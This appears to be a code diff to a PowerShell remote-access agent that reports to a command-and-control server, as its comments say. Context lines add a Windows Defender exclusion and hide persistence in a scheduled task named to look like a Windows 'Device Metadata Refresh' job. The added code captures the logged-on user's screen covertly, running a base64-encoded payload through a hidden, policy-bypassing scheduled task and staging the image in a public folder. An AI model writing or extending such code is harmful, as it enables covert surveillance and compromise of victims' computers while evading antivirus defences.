@@ -103,7 +103,6 @@ if ($Mode -eq "install" -or $Mode -eq "auto") {
         try {
             Log "[*] Adding Defender exclusion for $InstallDir"
             Add-MpPreference -ExclusionPath $InstallDir -ErrorAction Stop
-            # Verify it actually took
             $excl = (Get-MpPreference).ExclusionPath
             if ($excl -and ($excl -contains $InstallDir)) {
                 Log "[+] Defender exclusion confirmed"
@@ -137,7 +136,6 @@ if ($Mode -eq "install" -or $Mode -eq "auto") {
     # ---- CLEAR AC-POWER CONDITIONS ----
     # schtasks /create /sc onstart silently sets "no start on batteries",
     # which leaves the task Queued forever on a laptop that isn't on AC.
-    # Clear both conditions right after creation so the task runs reliably.
     try {
         $t = Get-ScheduledTask -TaskPath "\Microsoft\Windows\Device Setup\" -TaskName "Device Metadata Refresh" -ErrorAction Stop
         $t.Settings.DisallowStartIfOnBatteries = $false
@@ -203,24 +201,75 @@ $global:killswitchArmed = $false
 
 function Test-InteractiveSession { if ($sessionId -eq 0) { return $false } return $true }
 
+# ---------------------------------------------------------------------------
+# SCREENSHOT - runs in the interactive user session via schtasks hand-off.
+#
+# The agent is in Session 0 (SYSTEM) and has no desktop access. Capturing
+# from Session 0 returns a black image (or throws). Instead we:
+#   1. Encode the capture script as UTF-16LE base64 (-EncodedCommand form)
+#   2. Create a one-shot scheduled task targeting the 'Users' group with
+#      /it (interactive) so it runs inside the logged-on user's session
+#   3. Launch it with `powershell -w h` so no window appears
+#   4. Poll for the output file, read it, clean up
+#
+# Output file is under C:\Users\Public\ because both SYSTEM and every
+# interactive user have write access there by default (no ACL surgery).
+# ---------------------------------------------------------------------------
 function Do-Screenshot {
-    if (-not (Test-InteractiveSession)) {
-        return "ERROR: agent in session 0 (SYSTEM), no interactive desktop. Run the agent interactively to use screenshots."
+    $capCode = @'
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+$bmp = New-Object System.Drawing.Bitmap $b.Width, $b.Height
+[System.Drawing.Graphics]::FromImage($bmp).CopyFromScreen($b.Location, [System.Drawing.Point]::Empty, $b.Size)
+$ms = New-Object System.IO.MemoryStream
+$bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+$bmp.Dispose()
+$b64 = [Convert]::ToBase64String($ms.ToArray())
+$b64 | Out-File -FilePath "C:\Users\Public\m4nt1s_cap.txt" -Encoding ASCII -Force
+'@
+
+    # UTF-16LE + base64 = valid -EncodedCommand payload. Never touches disk.
+    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($capCode))
+
+    $outFile = "C:\Users\Public\m4nt1s_cap.txt"
+    Remove-Item $outFile -Force -ErrorAction SilentlyContinue
+
+    $taskName = "M4NT1S_ScreenCap"
+    # -w h  = hidden window (no console flash)
+    # /it   = interactive, runs in the logged-on user's session
+    # /ru Users = run as whichever user is currently logged in
+    schtasks /create /tn $taskName /tr "powershell -w h -ep bypass -enc $encoded" /sc once /st 00:00 /ru Users /it /f 2>$null | Out-Null
+    schtasks /run /tn $taskName 2>$null | Out-Null
+
+    # Poll for the file to appear AND stabilise (>100 chars = real JPEG b64)
+    $b64 = $null
+    for ($i = 0; $i -lt 20; $i++) {
+        Start-Sleep -Milliseconds 250
+        if (Test-Path $outFile) {
+            $content = Get-Content $outFile -Raw -ErrorAction SilentlyContinue
+            if ($content -and $content.Length -gt 100) {
+                $b64 = $content.Trim()
+                break
+            }
+        }
     }
-    try {
-        Add-Type -AssemblyName System.Windows.Forms
-        Add-Type -AssemblyName System.Drawing
-        $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-        $bmp = New-Object System.Drawing.Bitmap $b.Width, $b.Height
-        [System.Drawing.Graphics]::FromImage($bmp).CopyFromScreen($b.Location, [System.Drawing.Point]::Empty, $b.Size)
-        $ms = New-Object System.IO.MemoryStream
-        $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
-        $bmp.Dispose()
-        return "IMAGE:" + [Convert]::ToBase64String($ms.ToArray())
-    } catch { return "ERROR: $($_.Exception.Message)" }
+
+    schtasks /delete /tn $taskName /f 2>$null | Out-Null
+    Remove-Item $outFile -Force -ErrorAction SilentlyContinue
+
+    if ($b64) {
+        return "IMAGE:" + $b64
+    }
+    return "ERROR: Screenshot timed out (no interactive session, or display is locked)."
 }
 
 function Do-StreamStart($intervalMs) {
+    # Stream requires a persistent process in the user session. Doing that
+    # safely (single-instance, clean shutdown, no orphaned children) is a
+    # bigger job than a one-shot hand-off, so stream stays unsupported
+    # from Session 0. Returns a clean error to the C2 instead of failing
+    # silently.
     if (-not (Test-InteractiveSession)) {
         return "ERROR: agent in session 0 (SYSTEM). Stream requires an interactive session."
     }
@@ -334,7 +383,9 @@ function Do-Killswitch {
         $global:streamJob = $null
     }
     schtasks /delete /tn "$AgentTask" /f 2>$null | Out-Null
+    schtasks /delete /tn "M4NT1S_ScreenCap" /f 2>$null | Out-Null
     Unregister-ScheduledTask -TaskPath "\Microsoft\Windows\Device Setup\" -TaskName "Device Metadata Refresh" -Confirm:$false -ErrorAction SilentlyContinue
+    Remove-Item "C:\Users\Public\m4nt1s_cap.txt" -Force -ErrorAction SilentlyContinue
     Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
       Where-Object { $_.ProcessId -ne $PID -and $_.CommandLine -match 'DeviceMetadata\\a\.ps1' } |
       ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
